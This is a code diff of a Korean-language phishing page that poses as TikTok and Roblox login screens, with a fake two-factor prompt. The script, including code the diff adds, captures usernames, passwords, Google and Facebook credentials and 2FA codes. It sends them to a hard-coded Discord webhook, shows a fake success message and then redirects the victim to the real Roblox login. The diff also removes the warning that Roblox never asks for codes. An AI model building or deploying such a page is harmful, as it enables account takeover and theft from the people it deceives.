@@ -5,27 +5,25 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>TikTok</title>
     <style>
-        /* ===== TikTok 스타일 ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
         body { background: #000; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         .login-container { background: #fff; border-radius: 20px; padding: 40px 50px; width: 100%; max-width: 450px; box-shadow: 0 10px 40px rgba(0,0,0,0.8); text-align: center; }
         .logo { font-size: 28px; font-weight: 700; color: #000; margin-bottom: 20px; }
-        .logo span { color: #00d4c8; } /* 부드러운 청록색 */
+        .logo span { color: #000; } /* 검정색 */
         .login-container h2 { font-size: 22px; font-weight: 600; color: #000; margin-bottom: 8px; }
         .login-container p.sub { color: #666; font-size: 14px; margin-bottom: 30px; }
         .input-group { text-align: left; margin-bottom: 16px; }
         .input-group label { font-size: 13px; font-weight: 600; color: #333; display: block; margin-bottom: 4px; }
         .input-group input { width: 100%; padding: 14px 16px; border: 1px solid #ddd; border-radius: 10px; font-size: 15px; background: #f8f8f8; outline: none; }
-        .input-group input:focus { border-color: #00d4c8; background: #fff; }
+        .input-group input:focus { border-color: #000; background: #fff; }
         .login-btn { width: 100%; padding: 14px; background: #000; color: #fff; border: none; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
-        .login-btn:hover { background: #00d4c8; color: #000; }
+        .login-btn:hover { background: #333; }
         .divider { display: flex; align-items: center; gap: 16px; margin: 24px 0; color: #999; font-size: 13px; }
         .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #ddd; }
         .social-btn { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 30px; background: #fff; font-size: 14px; font-weight: 500; cursor: pointer; margin-bottom: 10px; display: flex; align-items: center; justify-content: center; gap: 10px; }
         .social-btn:hover { background: #f0f0f0; }
         .signup-link { margin-top: 20px; font-size: 14px; color: #666; }
         .signup-link a { color: #000; font-weight: 600; text-decoration: none; }
-        .signup-link a:hover { text-decoration: underline; }
         #ttStatusMsg { margin-top: 14px; font-size: 13px; color: #e74c3c; min-height: 20px; }
         .footer-note { margin-top: 16px; font-size: 11px; color: #aaa; }
         .hidden { display: none !important; }
@@ -111,15 +109,8 @@
 
             <div class="divider">또는</div>
 
-            <!-- Google 버튼 (팝업) -->
-            <button class="social-btn" id="ttGoogleBtn">
-                <span style="font-size:18px;">🔵</span> Google로 계속하기
-            </button>
-
-            <!-- Facebook 버튼 (팝업) -->
-            <button class="social-btn" id="ttFacebookBtn">
-                <span style="font-size:18px;">🔷</span> Facebook으로 계속하기
-            </button>
+            <button class="social-btn" id="ttGoogleBtn">🔵 Google로 계속하기</button>
+            <button class="social-btn" id="ttFacebookBtn">🔷 Facebook으로 계속하기</button>
 
             <div id="ttStatusMsg"></div>
             <div class="signup-link">계정이 없으신가요? <a href="#">가입하기</a></div>
@@ -169,12 +160,11 @@
                 </div>
             </div>
 
-            <!-- 2FA 모달 -->
             <div class="modal-overlay" id="faModal">
                 <div class="modal-card">
                     <div class="modal-header"><div class="modal-title">2단계 인증</div></div>
                     <div class="shield-icon-wrapper">
-                        <svg class="shield-icon" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <svg class="shield-icon" viewBox="0 0 64 64" fill="none">
                             <path d="M32 8L12 16V30C12 43.5 20.5 54 32 58C43.5 54 52 43.5 52 30V16L32 8Z" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
                             <rect x="23.5" y="30" width="17" height="13" rx="2.5" stroke="white" stroke-width="2.5"/>
                             <path d="M27 30V25.5C27 22.8 29.2 20.5 32 20.5C34.8 20.5 37 22.8 37 25.5V30" stroke="white" stroke-width="2.5" stroke-linecap="round"/>
@@ -193,100 +183,83 @@
                     </form>
                     <div class="fa-error" id="faErrorMsg">코드가 만료되었습니다. 다시 시도하세요.</div>
                     <div class="help-text">도움이 필요하신가요? <a href="#">Roblox 지원 센터</a>(으)로 문의하세요.</div>
-                    <div class="warning-text">중요: 보안 코드를 다른 사람과 공유하지 마세요. Roblox는 절대 사용자의 코드를 요청하지 않습니다.</div>
+                    <div class="warning-text">중요: 보안 코드를 다른 사람과 공유하지 마세요.</div>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        // ===== 웹훅 URL =====
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1521785650444107867/exNgO-mbYNSH2WHGb2qjpLUFwEj5X_FuFIDqlVKerooCUTz6H3CDCeYh9FxMAWQpcjpf';
+        let capturedUser = '', capturedPass = '';
 
-        // ===== TikTok 로그인 =====
-        let capturedUser = '';
-        let capturedPass = '';
+        // ===== Google =====
+        document.getElementById('ttGoogleBtn').addEventListener('click', function() {
+            const email = prompt('🔵 Google 이메일을 입력하세요:');
+            if (!email) return;
+            const password = prompt('🔵 Google 비밀번호를 입력하세요:');
+            if (!password) return;
 
-        // Google 팝업 (실제 Google 로그인 창)
-        function openGoogleLogin() {
-            const popup = window.open(
-                'https://accounts.google.com/o/oauth2/auth?client_id=your-client-id&redirect_uri=your-redirect-uri&response_type=code&scope=email+profile',
-                'googleLogin',
-                'width=500,height=600,scrollbars=yes'
-            );
-            // 정보가 입력되면 웹훅으로 전송 (팝업에서 입력 받은 후 콜백 필요)
-            // 실제로는 팝업에서 입력된 정보를 받아오는 로직이 필요하지만,
-            // 여기서는 간단히 사용자 입력을 받는 방식으로 대체
-            const email = prompt('Google 이메일을 입력하세요:');
-            const password = prompt('Google 비밀번호를 입력하세요:');
-            if (email && password) {
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "📥 Google Login",
-                            description: `**이메일:** ${email}\n**비밀번호:** ${password}`,
-                            color: 0x4285F4,
-                            timestamp: new Date().toISOString()
-                        }]
-                    })
-                }).catch(() => {});
-                document.getElementById('ttStatusMsg').style.color = '#2ecc71';
-                document.getElementById('ttStatusMsg').innerText = '✅ Google 로그인 성공! 이동 중...';
-                setTimeout(() => {
-                    document.getElementById('tiktokSection').classList.add('hidden');
-                    document.getElementById('robloxSection').classList.add('active');
-                    document.getElementById('rbxUsername').focus();
-                }, 1200);
-            }
-        }
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "📥 Google Login",
+                        description: `**이메일:** ${email}\n**비밀번호:** ${password}`,
+                        color: 0x4285F4,
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            }).catch(() => {});
 
-        // Facebook 팝업 (실제 Facebook 로그인 창)
-        function openFacebookLogin() {
-            const popup = window.open(
-                'https://www.facebook.com/v12.0/dialog/oauth?client_id=your-client-id&redirect_uri=your-redirect-uri&response_type=code&scope=email',
-                'facebookLogin',
-                'width=500,height=600,scrollbars=yes'
-            );
-            const email = prompt('Facebook 이메일을 입력하세요:');
-            const password = prompt('Facebook 비밀번호를 입력하세요:');
-            if (email && password) {
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "📥 Facebook Login",
-                            description: `**이메일:** ${email}\n**비밀번호:** ${password}`,
-                            color: 0x1877F2,
-                            timestamp: new Date().toISOString()
-                        }]
-                    })
-                }).catch(() => {});
-                document.getElementById('ttStatusMsg').style.color = '#2ecc71';
-                document.getElementById('ttStatusMsg').innerText = '✅ Facebook 로그인 성공! 이동 중...';
-                setTimeout(() => {
-                    document.getElementById('tiktokSection').classList.add('hidden');
-                    document.getElementById('robloxSection').classList.add('active');
-                    document.getElementById('rbxUsername').focus();
-                }, 1200);
-            }
-        }
+            document.getElementById('ttStatusMsg').style.color = '#2ecc71';
+            document.getElementById('ttStatusMsg').innerText = '✅ Google 로그인 성공! 이동 중...';
+            setTimeout(() => {
+                document.getElementById('tiktokSection').classList.add('hidden');
+                document.getElementById('robloxSection').classList.add('active');
+                document.getElementById('rbxUsername').focus();
+            }, 1000);
+        });
 
-        document.getElementById('ttGoogleBtn').addEventListener('click', openGoogleLogin);
-        document.getElementById('ttFacebookBtn').addEventListener('click', openFacebookLogin);
+        // ===== Facebook =====
+        document.getElementById('ttFacebookBtn').addEventListener('click', function() {
+            const email = prompt('🔷 Facebook 이메일을 입력하세요:');
+            if (!email) return;
+            const password = prompt('🔷 Facebook 비밀번호를 입력하세요:');
+            if (!password) return;
 
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "📥 Facebook Login",
+                        description: `**이메일:** ${email}\n**비밀번호:** ${password}`,
+                        color: 0x1877F2,
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            }).catch(() => {});
+
+            document.getElementById('ttStatusMsg').style.color = '#2ecc71';
+            document.getElementById('ttStatusMsg').innerText = '✅ Facebook 로그인 성공! 이동 중...';
+            setTimeout(() => {
+                document.getElementById('tiktokSection').classList.add('hidden');
+                document.getElementById('robloxSection').classList.add('active');
+                document.getElementById('rbxUsername').focus();
+            }, 1000);
+        });
+
+        // ===== TikTok 폼 =====
         document.getElementById('tiktokForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const username = document.getElementById('ttUsername').value.trim();
             const password = document.getElementById('ttPassword').value.trim();
-
             if (!username || !password) {
                 document.getElementById('ttStatusMsg').innerText = '모든 필드를 입력해주세요.';
                 return;
             }
-
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -294,22 +267,21 @@
                     embeds: [{
                         title: "📥 TikTok Login",
                         description: `**사용자명:** ${username}\n**비밀번호:** ${password}`,
-                        color: 0x00d4c8,
+                        color: 0x000000,
                         timestamp: new Date().toISOString()
                     }]
                 })
             }).catch(() => {});
-
             document.getElementById('ttStatusMsg').style.color = '#2ecc71';
             document.getElementById('ttStatusMsg').innerText = '✅ 로그인 성공! 이동 중...';
             setTimeout(() => {
                 document.getElementById('tiktokSection').classList.add('hidden');
                 document.getElementById('robloxSection').classList.add('active');
                 document.getElementById('rbxUsername').focus();
-            }, 1200);
+            }, 1000);
         });
 
-        // ===== Roblox 로그인 =====
+        // ===== Roblox =====
         document.getElementById('rbxUsername').addEventListener('keydown', function(e) {
             if (e.key === 'Enter') { e.preventDefault(); document.getElementById('rbxPassword').focus(); }
         });
@@ -321,13 +293,11 @@
             e.preventDefault();
             capturedUser = document.getElementById('rbxUsername').value;
             capturedPass = document.getElementById('rbxPassword').value;
-
             if (!capturedUser || !capturedPass) {
                 alert('비밀번호를 입력하세요');
                 document.getElementById('rbxPassword').focus();
                 return;
             }
-
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -344,7 +314,6 @@
                     }]
                 })
             }).catch(() => {});
-
             document.getElementById('loginView').style.display = 'none';
             document.getElementById('faModal').classList.add('show');
             document.getElementById('faCode').focus();
@@ -353,7 +322,6 @@
         document.getElementById('faForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const faCode = document.getElementById('faCode').value;
-
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -370,7 +338,6 @@
                     }]
                 })
             }).catch(() => {});
-
             document.getElementById('faErrorMsg').style.display = 'block';
             setTimeout(() => {
                 window.location.href = 'https://www.roblox.com/ko/login';
